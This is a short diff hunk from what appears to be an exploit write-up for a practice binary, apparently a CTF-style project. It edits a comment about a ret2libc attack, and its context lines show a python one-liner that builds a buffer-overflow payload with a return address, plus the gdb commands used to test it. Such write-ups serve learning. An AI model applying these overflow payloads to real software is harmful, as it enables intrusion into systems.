@@ -450,7 +450,7 @@ EXPLOIT
 	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
 
 # After finishing the project, I got the chance to talk to the project creator about the ret2libc above
-# He told me there were other ways to exploit this binary so I looked deeper
+# He told me there were other ways to exploit this binary so I looked deeper into the ret2libc developed above
 =>  python -c 'print "a"*40 + "\xd0" + "\n" + "b"*200 + "\x9a\xe1\xaf\xf7\xff\x7f\x00\x00"' > /tmp/a
 => b *main+16
 => r < /tmp/a
